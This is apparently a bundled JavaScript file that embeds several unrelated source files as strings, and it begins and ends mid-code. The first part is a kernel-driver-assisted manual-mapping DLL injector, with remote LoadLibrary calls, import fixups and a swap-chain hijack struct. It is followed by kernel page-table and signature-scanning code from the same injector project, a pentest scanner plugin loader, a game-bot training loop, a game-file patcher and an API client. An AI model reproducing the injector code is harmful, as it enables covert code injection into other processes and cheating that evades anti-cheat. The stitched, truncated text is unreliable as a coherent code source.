	PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)rva_va(image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, image_nt_headers, p_local_img);
	if (!image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress || !image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) return true;

	LPSTR module_name = NULL;
	while ((module_name = (LPSTR)rva_va(import_desc->Name, image_nt_headers, p_local_img)))
	{
		uintptr_t base_image;
		base_image = call_remote_load_library(module_name);

		if (!base_image)
			return false;

		PIMAGE_THUNK_DATA ih_data = (PIMAGE_THUNK_DATA)rva_va(import_desc->FirstThunk, image_nt_headers, p_local_img);
		while (ih_data->u1.AddressOfData)
		{
			if (ih_data->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)(ih_data->u1.Ordinal & 0xFFFF));
			else
			{
				IMAGE_IMPORT_BY_NAME* ibn = (PIMAGE_IMPORT_BY_NAME)rva_va(ih_data->u1.AddressOfData, image_nt_headers, p_local_img);
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)ibn->Name);
				TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, ih_data->u1.Function);
			} 
			ih_data++;
		} 
		import_desc++;
	} return true;
}

std::uintptr_t GetRemoteImageExport( std::uintptr_t image, const std::string& name )
{
	auto& driver = io::DriverControl::Instance();

	if( !image )
	{
		E_LOG( "%s: image is 0!", __FUNCTION__ );
		return 0;
	}

	const auto image_dos_header = driver.Read< IMAGE_DOS_HEADER >( image );

	if( image_dos_header.e_magic != IMAGE_DOS_SIGNATURE )
	{
		E_LOG( "%s: Not a valid DOS image!", __FUNCTION__ );
		return 0;
	}

	const auto image_nt_headers = driver.Read< IMAGE_NT_HEADERS >( image + image_dos_header.e_lfanew );

	if( image_nt_headers.Signature != IMAGE_NT_SIGNATURE )
	{
		E_LOG( "%s: Not a valid NT image!", __FUNCTION__ );
		return 0;
	}

	const auto& directory_entry_export = image_nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if( !directory_entry_export.VirtualAddress || !directory_entry_export.Size )
	{
		E_LOG( "%s: Not a valid image export directory!", __FUNCTION__ );
		return 0;
	}

	const auto image_export_directory_data = std::make_unique< std::uint8_t[] >( directory_entry_export.Size );

	if( !driver.ReadMemory( image + directory_entry_export.VirtualAddress, image_export_directory_data.get(), directory_entry_export.Size ) )
	{
		E_LOG( "%s: ReadMemory( 0x%016llX, 0x%08X ) error!", __FUNCTION__, image + directory_entry_export.VirtualAddress, directory_entry_export.Size );
		return 0;
	}

	const auto image_export_directory = PIMAGE_EXPORT_DIRECTORY( image_export_directory_data.get() );
	const auto image_export_displacement = std::uintptr_t( image_export_directory_data.get() ) - directory_entry_export.VirtualAddress;

	const auto address_of_functions = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfFunctions );
	const auto address_of_names = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfNames );
	const auto address_of_name_ordinals = reinterpret_cast< std::uint16_t* >( image_export_displacement + image_export_directory->AddressOfNameOrdinals );

	for( auto i = 0ul; i < image_export_directory->NumberOfNames; i++ )
	{
		const auto export_name = std::string( PCHAR( image_export_displacement + address_of_names[ i ] ) );

		if( core::ToLower( export_name ) == core::ToLower( name ) )
		{
			const auto export_ordinal = address_of_name_ordinals[ i ];
			return ( image + address_of_functions[ export_ordinal ] );
		}
	}

	E_LOG( "%s: Image export \\"%s\\" is not found in [0x%016llX]!", __FUNCTION__, name.c_str(), image );
	return 0;
}

bool MapImageImportDescriptor( std::uintptr_t image )
{
	auto& driver = io::DriverControl::Instance();

	const auto image_nt_headers = GetImageNtHeaders( image );

	if( !image_nt_headers )
		return false;

	const auto image_data_directory = image_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

	if( !image_data_directory.VirtualAddress || !image_data_directory.Size )
		return true;

	auto import_descriptor = reinterpret_cast< IMAGE_IMPORT_DESCRIPTOR* >( image + image_data_directory.VirtualAddress );

	while( import_descriptor && import_descriptor->Name )
	{
		const auto import_descriptor_name = reinterpret_cast< const char* >( image + import_descriptor->Name );
		const auto import_descriptor_name_wide = core::ToWideString( import_descriptor_name );
		const auto import_descriptor_image = driver.GetImage( import_descriptor_name_wide.c_str() );

		if( import_descriptor_image )
		{
			auto thunk_data = reinterpret_cast< IMAGE_THUNK_DATA* >( image + import_descriptor->FirstThunk );

			while( thunk_data && thunk_data->u1.AddressOfData )
			{
				if (!(thunk_data->u1.Ordinal & IMAGE_ORDINAL_FLAG64))
				{
					const auto import_by_name = reinterpret_cast< IMAGE_IMPORT_BY_NAME* >( image + thunk_data->u1.AddressOfData );
					const auto import_procedure = GetRemoteImageExport( import_descriptor_image, import_by_name->Name );

					if( import_procedure )
					{
						TRACE( "%s: %s: [0x%016llX]", __FUNCTION__, import_by_name->Name, import_procedure );
						thunk_data->u1.Function = import_procedure;
					}
				}

				thunk_data++;
			}
		}

		import_descriptor++;
	}

	return true;
}

struct ImageMapData
{
	std::uintptr_t m_base = 0;
	std::uint32_t m_size = 0;

	std::uintptr_t m_swap_chain = 0;
	std::uintptr_t m_swap_chain_restore = 0;

	std::uint32_t m_nt_query_virtual_memory = 0;
};

#define LOG		E_LOG

#pragma pack( push, 8 )

struct ExecuteData
{
	std::uint32_t m_status = 0;			// 0x0000
	
	std::uint64_t m_procedure = 0;	// 0x0008
	
	std::uint64_t m_rcx = 0;				// 0x0010
	std::uint64_t m_rdx = 0;				// 0x0018
	std::uint64_t m_r8 = 0;					// 0x0020

	std::uint64_t m_rax = 0;				// 0x0028
};
// sizeof( ExecuteData ) = 0x0030

`,Sh=`// page_walk.cpp — kernel-side page-table walking (PML4 -> PDPT -> PD -> PT) for present/readable/writeable/executable checks
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/winsdk/pagesdk.cpp

#include "pagesdk.hpp"
#include "log.hpp"

namespace atom::win32
{

void* GetVirtualForPhysical( const void* pointer )
{
	PHYSICAL_ADDRESS physical_address = { };
	physical_address.QuadPart = reinterpret_cast< LONGLONG >( pointer );
	return MmGetVirtualForPhysical( physical_address );
}

void* GetVirtualForPhysical( std::uintptr_t address )
{
	PHYSICAL_ADDRESS physical_address = { };
	physical_address.QuadPart = static_cast< LONGLONG >( address );
	return MmGetVirtualForPhysical( physical_address );
}

template< typename Type = void* >
Type GetVirtualAddress( const void* pointer )
{
	const auto virtual_address = GetVirtualForPhysical( pointer );
	return Type( virtual_address );
}

template< typename Type = void* >
Type GetVirtualAddress( std::uintptr_t address )
{
	const auto virtual_address = GetVirtualForPhysical( address );
	return Type( virtual_address );
}

bool GetPageData( const void* pointer, PageData* page_data )
{
	if( !page_data )
	{
		return false;
	}

	VIRTUAL_ADDRESS virtual_address = { };
	virtual_address.Value = reinterpret_cast< std::uint64_t >( pointer );

	CR3 cr3 = { };
	cr3.Value = __readcr3();

	auto pml4e = PFN_TO_PAGE( cr3.x64.Bitmap.PML4 ) + virtual_address.x64.Generic.PageMapLevel4Offset * sizeof( PML4E );
	page_data->m_pml4e = GetVirtualAddress< PML4E* >( pml4e );
	
	if( !page_data->m_pml4e )
	{
		return false;
	}

	if( !page_data->m_pml4e->x64.Generic.P )
	{
		return true;
	}

	auto pdpe = PFN_TO_PAGE( page_data->m_pml4e->x64.Generic.PDP ) + virtual_address.x64.Generic.PageDirectoryPointerOffset * sizeof( PDPE );
	page_data->m_pdpe = GetVirtualAddress< PDPE* >( pdpe );

	if( !page_data->m_pdpe )
	{
		return false;
	}

	if( page_data->m_pdpe->x64.Generic.PS )
	{
		if( !page_data->m_pdpe->x64.PageSize.Page1Gb.P )
		{
			return false;
		}

		page_data->m_type = PageData::Type::PageSize1Gb;
	}
	else
	{
		auto pde = PFN_TO_PAGE( page_data->m_pdpe->x64.NonPageSize.Generic.PD ) + virtual_address.x64.NonPageSize.Generic.PageDirectoryOffset * sizeof( PDE );
		page_data->m_pde = GetVirtualAddress< PDE* >( pde );

		if( !page_data->m_pde )
		{
			return false;
		}

		if( page_data->m_pde->x64.Generic.PS )
		{
			page_data->m_type = PageData::Type::PageSize2Mb;
		}
		else
		{
			page_data->m_type = PageData::Type::PageSize4Kb;

			auto pte = PFN_TO_PAGE( page_data->m_pde->x64.Page4Kb.PT ) + virtual_address.x64.NonPageSize.Page4Kb.PageTableOffset * sizeof( PTE );
			page_data->m_pte = GetVirtualAddress< PTE* >( pte );

			if( !page_data->m_pte )
			{
				return false;
			}
		}
	}

	return true;
}

bool GetPageData( std::uintptr_t address, PageData* page_data )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return GetPageData( pointer, page_data );
}

bool IsPagePresent( const void* pointer, std::size_t* page_size )
{
	bool page_present = false;
	PageData page_data = { };

	if( GetPageData( pointer, &page_data ) )
	{
		if( page_size )
		{
			*page_size = 0;
		}

		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
			{
				if( page_size )
				{
					*page_size = 4096;
				}
				page_present = page_data.m_pte->x64.Page4Kb.P;
				break;
			}
			case PageData::Type::PageSize2Mb:
			{
				if( page_size )
				{
					*page_size = 2048 * 1024;
				}
				page_present = page_data.m_pde->x64.Page2Mb.P;
				break;
			}
			case PageData::Type::PageSize1Gb:
			{
				if( page_size )
				{
					*page_size = 1024 * 1024 * 1024;
				}
				page_present = page_data.m_pdpe->x64.PageSize.Page1Gb.P;
				break;
			}
			default:
			{
				TRACE( "%s: Unknown page type = '%u'!", __FUNCTION__, static_cast< std::uint32_t >( page_data.m_type ) );
				break;
			}
		}

		return page_present;
	}
}

bool IsPagePresent( std::uintptr_t address, std::size_t* page_size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsPagePresent( pointer, page_size );
}

bool IsProcessPagePresent( PEPROCESS process, const void* pointer, std::size_t* page_size )
{
	if( !process || process == PsGetCurrentProcess() )
	{
		return IsPagePresent( pointer, page_size );
	}

	KAPC_STATE apc_state = { };
	KeStackAttachProcess( process, &apc_state );
	bool page_present = IsPagePresent( pointer, page_size );
	KeUnstackDetachProcess( &apc_state );
	return page_present;
}

bool IsProcessPagePresent( PEPROCESS process, std::uintptr_t address, std::size_t* page_size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsProcessPagePresent( process, pointer, page_size );
}

bool IsMemoryRangePresent( PEPROCESS process, const void* pointer, std::size_t size )
{
	if( !size )
	{
		return false;
	}

	KAPC_STATE apc_state = { };

	auto page_process = process && process != PsGetCurrentProcess();

	if( page_process )
	{
		KeStackAttachProcess( process, &apc_state );
	}

	auto page_present = false;
	auto page = pointer;

	do
	{
		std::size_t page_size = 0;
		page_present = IsPagePresent( page, &page_size ) && page_size;
		
		if( !page_present )
		{
			break;
		}

		page = reinterpret_cast< const void* >( reinterpret_cast< std::uintptr_t >( ALIGN_DOWN_POINTER_BY( page, page_size ) ) + page_size );
	}
	while( page < reinterpret_cast< const void* >( reinterpret_cast< std::uintptr_t >( pointer ) + size ) );

	if( page_process )
	{
		KeUnstackDetachProcess( &apc_state );
	}

	return page_present;
}

bool IsMemoryRangePresent( PEPROCESS process, std::uintptr_t address, std::size_t size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsMemoryRangePresent( process, pointer, size );
}

bool IsPageReadable( std::uintptr_t address )
{
	std::size_t page_size = 0;
	return IsPagePresent( address, &page_size ) && page_size;
}

bool IsPageWriteable( std::uintptr_t address )
{
	bool page_write = false;
	PageData page_data = { };

	if( GetPageData( address, &page_data ) )
	{
		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
			{
				page_write = page_data.m_pte->x64.Page4Kb.P && page_data.m_pte->x64.Page4Kb.RW;
				break;
			}
			case PageData::Type::PageSize2Mb:
			{
				page_write = page_data.m_pde->x64.Page2Mb.P && page_data.m_pde->x64.Page2Mb.RW;
				break;
			}
			case PageData::Type::PageSize1Gb:
			{
				page_write = page_data.m_pdpe->x64.PageSize.Page1Gb.P && page_data.m_pdpe->x64.PageSize.Page1Gb.RW;
				break;
			}
			default:
			{
				TRACE( "%s: Unknown page type = '%u'!", __FUNCTION__, static_cast< std::uint32_t >( page_data.m_type ) );
				break;
			}
		}
	}

	return page_write;
}

bool IsPageExecuteable( std::uintptr_t address )
{
	bool page_execute = false;
	PageData page_data = { };

	if( GetPageData( address, &page_data ) )
	{
		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
`,bh=`# pentest_plugin.py — plugin engine: YAML-template + Python module discovery and dispatch
# Source: Desktop/pentest/src/scan_tool/core/plugin_engine.py

from __future__ import annotations

import importlib
import importlib.util
import inspect
import logging
import pkgutil
import re
from abc import ABC, abstractmethod
from pathlib import Path
from typing import TYPE_CHECKING, AsyncGenerator, Optional

if TYPE_CHECKING:
    from scan_tool.core.context import ScanContext

import yaml

from scan_tool.core.target import AttackSurface, Finding

logger = logging.getLogger("scan_tool.plugins")


class BaseModule(ABC):
    name:        str = ""
    description: str = ""
    severity:    str = "info"
    phase:       str = "active"

    @abstractmethod
    async def run(self, target, http, surface, store) -> AsyncGenerator[Finding, None]:
        yield  # pragma: no cover

    async def run_with_context(self, ctx: "ScanContext") -> AsyncGenerator[Finding, None]:
        """New-style entry point; delegates to legacy run() for backward compat."""
        async for finding in self.run(ctx.target, ctx.http, ctx.surface, ctx.store):
            yield finding

    def should_run(self, surface: AttackSurface) -> bool:
        return True


class YAMLTemplateModule(BaseModule):
    """Nuclei-style declarative module loaded from a YAML template."""

    def __init__(self, template_path: Path):
        data         = yaml.safe_load(template_path.read_text())
        self.name    = data["id"]
        info         = data.get("info", {})
        self.description = info.get("description", "")
        self.severity    = info.get("severity", "info")
        self.phase       = "active"
        self._requests   = data.get("requests", [])

    async def run(self, target, http, surface, store):
        for req_def in self._requests:
            method  = req_def.get("method", "GET")
            path    = req_def.get("path", "/")
            url     = target.url.rstrip("/") + path
            try:
                resp = await http.request(method, url,
                                          headers=req_def.get("headers", {}),
                                          data=req_def.get("body"),
                                          module=self.name)
            except Exception as e:
                logger.warning(f"Template {self.name} request failed: {e}")
                continue

            if self._check_matchers(resp, req_def):
                yield Finding(
                    name=self.description or self.name,
                    severity=self.severity,
                    module=self.name,
                    endpoint=f"{method} {path}",
                    evidence=resp.body[:500],
                    recommendation=f"Review {path} for {self.name}",
                )

    def _check_matchers(self, resp, req_def) -> bool:
        matchers  = req_def.get("matchers", [])
        condition = req_def.get("matchers_condition", "or")
        if not matchers:
            return False

        results = []
        for m in matchers:
            mtype = m.get("type", "")
            if mtype == "status":
                results.append(resp.status in m.get("status", []))
            elif mtype == "body":
                results.append(any(w in resp.body for w in m.get("words", [])))
            elif mtype == "header":
                for k, v in m.get("headers", {}).items():
                    results.append(resp.headers.get(k, "") == v)
            elif mtype == "regex":
                results.append(bool(re.search(m.get("pattern", ""), resp.body)))

        return all(results) if condition == "and" else any(results)


class PluginEngine:
    def __init__(self,
                 plugin_dirs:   Optional[list[Path]] = None,
                 template_dirs: Optional[list[Path]] = None):
        self._plugin_dirs   = plugin_dirs   or []
        self._template_dirs = template_dirs or []

    def load_modules(self, phases: Optional[list[str]] = None) -> list[BaseModule]:
        modules: list[BaseModule] = []
        modules.extend(self._load_builtin_modules())

        for tdir in self._template_dirs:
            if tdir.is_dir():
                for yaml_file in tdir.glob("*.yaml"):
                    try:
                        modules.append(YAMLTemplateModule(yaml_file))
                    except Exception as e:
                        logger.warning(f"Failed to load template {yaml_file}: {e}")

        for pdir in self._plugin_dirs:
            if pdir.is_dir():
                modules.extend(self._load_from_directory(pdir))

        if phases:
            modules = [m for m in modules if m.phase in phases]
        return modules

    def _load_builtin_modules(self) -> list[BaseModule]:
        modules = []
        try:
            import scan_tool.modules as mod_pkg
            for _, modname, _ in pkgutil.walk_packages(
                    mod_pkg.__path__, prefix="scan_tool.modules."):
                try:
                    mod = importlib.import_module(modname)
                    for attr_name in dir(mod):
                        attr = getattr(mod, attr_name)
                        if (inspect.isclass(attr)
                                and issubclass(attr, BaseModule)
                                and attr is not BaseModule
                                and not attr.__name__.startswith("_")
                                and getattr(attr, "name", "")):
                            modules.append(attr())
                except Exception as e:
                    logger.debug(f"Could not load module {modname}: {e}")
        except Exception as e:
            logger.debug(f"Could not walk modules package: {e}")
        return modules

    def _load_from_directory(self, directory: Path) -> list[BaseModule]:
        modules = []
        for py_file in directory.glob("*.py"):
            if py_file.name.startswith("_"):
                continue
            try:
                spec = importlib.util.spec_from_file_location(py_file.stem, py_file)
                mod  = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                for attr_name in dir(mod):
                    attr = getattr(mod, attr_name)
                    if (inspect.isclass(attr)
                            and issubclass(attr, BaseModule)
                            and attr is not BaseModule):
                        modules.append(attr())
            except Exception as e:
                logger.warning(f"Failed to load plugin {py_file}: {e}")
        return modules
`,Th=`# poe_ml_train.py — behavioral cloning training loop with FP16 mixed-precision + grad accumulation
# Source: Desktop/poe/src/training/train_policy.py

import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, random_split
from torch.amp import autocast, GradScaler
import structlog
from src.training.dataset import GameplayDataset
from src.decision.ml_policy import PolicyNetwork

logger = structlog.get_logger()


def get_device(force_gpu: bool = True) -> torch.device:
    if torch.cuda.is_available():
        gpu_name   = torch.cuda.get_device_name(0)
        vram_total = torch.cuda.get_device_properties(0).total_mem / (1024 ** 3)
        vram_free  = (torch.cuda.get_device_properties(0).total_mem -
                      torch.cuda.memory_allocated(0)) / (1024 ** 3)
        logger.info("gpu_detected", name=gpu_name,
                    vram_total=f"{vram_total:.1f}GB", vram_free=f"{vram_free:.1f}GB")
        return torch.device("cuda")
    elif force_gpu:
        raise RuntimeError("CUDA GPU required but not available")
    logger.warning("no_gpu", msg="Training on CPU — will be very slow")
    return torch.device("cpu")


def train_policy(
    epochs:         int   = 50,
    lr:             float = 1e-3,
    batch_size:     int   = 64,
    recordings_dir: str   = "data/recordings",
    output_path:    str   = "models/policy_net.pt",
    force_gpu:      bool  = True,
):
    device  = get_device(force_gpu)
    use_amp = device.type == "cuda"

    logger.info("training_policy", device=str(device), epochs=epochs,
                amp=use_amp, batch_size=batch_size)

    dataset = GameplayDataset(recordings_dir)
    if len(dataset) == 0:
        logger.error("no_training_data", msg="Record gameplay first using recorder.py")
        return

    train_size = int(0.9 * len(dataset))
    val_size   = len(dataset) - train_size
    train_set, val_set = random_split(dataset, [train_size, val_size])

    loader_kwargs = (
        {"num_workers": 4, "pin_memory": True, "persistent_workers": True}
        if device.type == "cuda" else {"num_workers": 0}
    )
    train_loader = DataLoader(train_set, batch_size=batch_size, shuffle=True,  **loader_kwargs)
    val_loader   = DataLoader(val_set,   batch_size=batch_size, shuffle=False, **loader_kwargs)

    model            = PolicyNetwork().to(device)
    action_criterion = nn.CrossEntropyLoss()
    pos_criterion    = nn.MSELoss()
    optimizer        = optim.Adam(model.parameters(), lr=lr)
    scheduler        = optim.lr_scheduler.ReduceLROnPlateau(optimizer, patience=5)
    scaler           = GradScaler("cuda") if use_amp else None

    best_val_loss = float("inf")

    for epoch in range(epochs):
        model.train()
        train_loss = 0.0

        for features, minimap, action, position in train_loader:
            features = features.to(device, non_blocking=True)
            minimap  = minimap.to(device,  non_blocking=True)
            action   = action.to(device,   non_blocking=True)
            position = position.to(device, non_blocking=True)

            optimizer.zero_grad(set_to_none=True)

            if use_amp:
                with autocast("cuda"):
                    action_logits, pos_pred = model(features, minimap)
                    loss = action_criterion(action_logits, action) + 0.5 * pos_criterion(pos_pred, position)
                scaler.scale(loss).backward()
                scaler.step(optimizer)
                scaler.update()
            else:
                action_logits, pos_pred = model(features, minimap)
                loss = action_criterion(action_logits, action) + 0.5 * pos_criterion(pos_pred, position)
                loss.backward()
                optimizer.step()

            train_loss += loss.item()

        train_loss /= len(train_loader)

        # ── Validation pass ───────────────────────────────────────────
        model.eval()
        val_loss, correct, total = 0.0, 0, 0
        with torch.no_grad():
            for features, minimap, action, position in val_loader:
                features = features.to(device, non_blocking=True)
                minimap  = minimap.to(device,  non_blocking=True)
                action   = action.to(device,   non_blocking=True)
                position = position.to(device, non_blocking=True)

                if use_amp:
                    with autocast("cuda"):
                        action_logits, pos_pred = model(features, minimap)
                else:
                    action_logits, pos_pred = model(features, minimap)

                val_loss += (action_criterion(action_logits, action) +
                             0.5 * pos_criterion(pos_pred, position)).item()
                pred     = action_logits.argmax(dim=1)
                correct += (pred == action).sum().item()
                total   += action.size(0)

        val_loss /= len(val_loader)
        acc = correct / total if total else 0.0
        scheduler.step(val_loss)

        logger.info("epoch", epoch=epoch + 1, train_loss=f"{train_loss:.4f}",
                    val_loss=f"{val_loss:.4f}", acc=f"{acc:.3f}")

        if val_loss < best_val_loss:
            best_val_loss = val_loss
            torch.save(model.state_dict(), output_path)
            logger.info("checkpoint_saved", path=output_path, val_loss=f"{val_loss:.4f}")
`,Ah=`// poe_null_scene.cs — GGPK bundle service: diff-based file patching over loose bundles
// Source: projects/poe_null/src/PoeNullEffects.Core/GgpkService.cs

using System.Runtime.InteropServices;
using LibGGPK3;
using LibBundledGGPK3;
using LibBundle3;
using LibBundle3.Nodes;
using PoeNullEffects.Core.Models;

namespace PoeNullEffects.Core;

public class GgpkService : IGgpkService
{
    private GGPK?          _ggpk;
    private BundledGGPK?   _bundledGgpk;
    private LibBundle3.Index? _looseIndex;
    private bool           _bundleIndexWorking;
    private byte[]?        _indexFileData;
    private GCHandle       _indexPinHandle;
    private bool           _pendingWrites;

    public bool   IsOpen                => _ggpk != null || _looseIndex != null;
    public bool   IsBundleIndexWorking  => _bundleIndexWorking;
    public string FilePath              { get; private set; } = "";

    public void WriteFile(string path, byte[] data)
    {
        EnsureOpen();

        var index = GetActiveIndex();
        if (index != null && index.TryGetFile(path, out var bundleFileRecord))
        {
            // Queue the write without saving — avoids file-lock conflicts
            // when patching multiple entries in one session.
            bundleFileRecord.Write(data, saveIndex: false);
            _pendingWrites = true;
            return;
        }

        if (_ggpk != null &&
            _ggpk.Root.TryFindNode(path, out var treeNode) &&
            treeNode is FileRecord fileRecord)
        {
            fileRecord.Write(data);
            return;
        }

        throw new FileNotFoundException($"File not found in bundle: {path}");
    }

    /// <summary>Flush the bundle index after a batch of WriteFile operations.</summary>
    public void SaveIndex()
    {
        if (!_pendingWrites) return;

        var index = GetActiveIndex();
        if (index != null)
        {
            index.Save();
            _pendingWrites = false;
        }
    }

    public byte[] ReadFile(string path)
    {
        EnsureOpen();

        var index = GetActiveIndex();
        if (index != null && index.TryGetFile(path, out var bundleFileRecord))
            return bundleFileRecord.Read().ToArray();

        if (_ggpk != null &&
            _ggpk.Root.TryFindNode(path, out var treeNode) &&
            treeNode is FileRecord fileRecord)
            return fileRecord.Read();

        throw new FileNotFoundException($"File not found: {path}");
    }

    public List<GgpkFileEntry> SearchFiles(string query, bool useRegex = false)
    {
        var allFiles = GetAllFiles();

        if (useRegex)
        {
            var regex = new System.Text.RegularExpressions.Regex(
                query,
                System.Text.RegularExpressions.RegexOptions.IgnoreCase |
                System.Text.RegularExpressions.RegexOptions.Compiled);
            return allFiles.Where(f => regex.IsMatch(f.Path)).ToList();
        }

        return allFiles
            .Where(f => f.Path.Contains(query, StringComparison.OrdinalIgnoreCase))
            .ToList();
    }

    private LibBundle3.Index? GetActiveIndex()
    {
        if (_looseIndex   != null) return _looseIndex;
        if (_bundledGgpk  != null && _bundleIndexWorking) return _bundledGgpk.Index;
        return null;
    }

    private void EnsureOpen()
    {
        if (_ggpk == null && _looseIndex == null)
            throw new InvalidOperationException("No GGPK file is open. Call Open() first.");
    }
}
`,Rh=`# poe_watcher_detect.py — foreground-window detection with PoE1 vs PoE2 disambiguation
# Source: 0xE666/path-of-exile-watcher/poe_watcher.py

import ctypes
import psutil


def process_running(name: str) -> bool:
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"] and p.info["name"].lower() == name.lower():
                return True
        except Exception:
            pass
    return False


def get_window_title_by_process_name(process_name: str) -> str | None:
    """Return the visible window title for the first window owned by *process_name*."""
    EnumWindows           = ctypes.windll.user32.EnumWindows
    EnumWindowsProc       = ctypes.WINFUNCTYPE(ctypes.c_bool,
                                               ctypes.POINTER(ctypes.c_int),
                                               ctypes.POINTER(ctypes.c_int))
    GetWindowText         = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength   = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible       = ctypes.windll.user32.IsWindowVisible
    GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId

    found_titles: list[str] = []
    target_pids:  list[int] = []

    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] and proc.info["name"].lower() == process_name.lower():
                target_pids.append(proc.info["pid"])
        except Exception:
            pass

    def callback(hwnd, lParam):
        if IsWindowVisible(hwnd):
            pid = ctypes.c_ulong()
            GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value in target_pids:
                length = GetWindowTextLength(hwnd)
                buff   = ctypes.create_unicode_buffer(length + 1)
                GetWindowText(hwnd, buff, length + 1)
                if buff.value:
                    found_titles.append(buff.value)
        return True

    EnumWindows(EnumWindowsProc(callback), 0)
    return found_titles[0] if found_titles else None


def detect_poe_version() -> tuple[int | None, str | None]:
    """
    Detect which Path of Exile executable is foregrounded.

    Returns (1, exe) for PoE 1, (2, exe) for PoE 2, or (None, None)
    if neither process is running.
    """
    poe_candidates = [
        "PathOfExile.exe",
        "PathOfExile_x64.exe",
        "PathOfExileSteam.exe",
        "PathOfExile_x64Steam.exe",
    ]

    for exe in poe_candidates:
        if process_running(exe):
            title = get_window_title_by_process_name(exe)
            if title:
                title_lower = title.lower()
                if "path of exile 2" in title_lower or "poe2" in title_lower:
                    return (2, exe)
                elif "path of exile" in title_lower:
                    return (1, exe)
            # Fall back to exe name heuristic when the window title is unavailable
            if "2" in exe.lower():
                return (2, exe)
            return (1, exe)

    return (None, None)
`,wh=`// sigscan.cpp — kernel-mode pattern scanner with section-aware iteration
// Source: desktop 3-15/injector-master/Driver/directmemory/scans.cpp

namespace atom::memory
{

#define INRANGE(x,a,b)    (x >= a && x <= b)
#define getBits( x )      (INRANGE(x,'0','9') ? (x - '0') : ((x&(~0x20)) - 'A' + 0xa))
#define getByte( x )      (getBits(x[0]) << 4 | getBits(x[1]))

std::uintptr_t ScanRegionInternal(
    const std::uint8_t* region_begin,
    const std::uint8_t* region_end,
    const char* signature)
{
    if (!region_begin || !region_end || !signature)
        return 0;

    auto scan_result  = static_cast<std::uintptr_t>(0);
    auto scan_compare = reinterpret_cast<const std::uint8_t*>(signature);

    for (auto scan_current = region_begin; scan_current < region_end; scan_current++)
    {
        if (is_terminator(scan_compare[0]))
            return scan_result;

        if (MmIsAddressValid(const_cast<std::uint8_t*>(scan_current)))
        {
            if (is_question(scan_compare[0]) || scan_current[0] == to_byte(scan_compare))
            {
                if (!scan_result)
                    scan_result = ToAddress(scan_current);

                if (is_terminator(scan_compare[2]))
                    return scan_result;

                const bool question[2] = {
                    is_question(scan_compare[0]),
                    is_question(scan_compare[1]),
                };

                if ((question[0] && question[1]) || (!question[0]))
                    scan_compare = (scan_compare + 3);
                else
                    scan_compare = (scan_compare + 2);
            }
            else
            {
                scan_compare = reinterpret_cast<const std::uint8_t*>(signature);
                scan_result  = 0;
            }
        }
    }
    return 0;
}

std::uintptr_t ScanImageInternal(std::uintptr_t image, const char* signature)
{
    if (!image) return 0;

    const auto image_nt_headers    = win32::GetImageNtHeaders(image);
    if (!image_nt_headers) return 0;

    const auto image_section_header = IMAGE_FIRST_SECTION(image_nt_headers);
    if (!image_section_header) return 0;

    for (std::uint16_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++)
    {
        const auto image_section = &image_section_header[i];

        const auto region_begin = reinterpret_cast<const std::uint8_t*>(
            image + image_section->VirtualAddress);
        const auto region_end   = reinterpret_cast<const std::uint8_t*>(
            image + image_section->VirtualAddress + image_section->Misc.VirtualSize);

        auto result = ScanRegionInternal(region_begin, region_end, signature);
        if (result)
            return result;
    }
    return 0;
}

// Mask-based find_signature for usermode callers
void* find_signature(void* memory, size_t size, const char* pattern, const char* mask)
{
    size_t sig_length = strlen(mask);
    if (sig_length > size) return nullptr;

    for (size_t i = 0; i < size - sig_length; i++)
    {
        bool found = true;
        for (size_t j = 0; j < sig_length; j++)
            found &= mask[j] == '?' || pattern[j] == *((char*)memory + i + j);

        if (found)
            return (char*)memory + i;
    }
    return nullptr;
}

} // namespace atom::memory
`,Ch=`# soundmap_request.py — authenticated request flow: trade creation, retry, and pagination
# Source: 0xE666/Soundmap-API/soundmap.py

import uuid
import time
import socket
import urllib.parse
import json
import requests


class Soundmap:  # continued — request layer

    def create_trade_offer(self, song_ids: list, coins: int = 0, note: str = "") -> tuple:
        """POST a new trade offer; returns (success, offer_id)."""
        if not isinstance(song_ids, list):
            raise ValueError("song_ids must be a list")

        offer_id = str(uuid.uuid4())
        payload = {
            "0": {
                "songIds": song_ids,
                "coins":   coins,
                "note":    note,
                "offerId": offer_id,
            }
        }
        url = f"{self.API_BASE}{self.API_CREATE_TRADE_OFFER}"
        try:
            resp = self.http.post(url, headers=self.headers, json=payload)
            resp.raise_for_status()
            return (True, offer_id) if resp.status_code == 200 else (False, None)
        except requests.exceptions.RequestException as e:
            print(f"Error creating trade offer: {e}")
            return (None, None)

    def fetch_songs(self, owner_id: str | None = None) -> dict | None:
        """Fetch all songs for an owner with exponential-backoff retry."""
